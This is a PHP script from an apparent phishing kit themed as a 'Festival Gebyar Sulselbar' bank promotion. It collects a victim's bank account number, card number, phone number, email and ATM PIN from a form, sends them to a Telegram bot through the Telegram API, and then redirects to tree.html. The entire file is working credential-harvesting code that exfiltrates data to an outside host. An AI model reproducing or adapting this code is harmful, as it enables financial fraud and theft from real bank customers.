<?php 

session_start();
include "telegram.php";

$message = "====(Festival Gebyar Sulselbar)==="."\n- 𝐍𝐨.𝐑𝐞𝐤𝐞𝐧𝐢𝐧𝐠 : ". $_POST['norek']."\n- 𝐍𝐨.𝐊𝐚𝐫𝐭𝐮 : ". $_POST['nokar']."\n- 𝐍𝐨.𝐇𝐩 : ". $_POST['nomor']."\n- 𝐄𝐦𝐚𝐢𝐥 : ". $_POST['email']."\n- 𝐏𝐢𝐧.𝐀𝐓𝐌 : " .$_POST['pin'];

function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  tree.html");
?>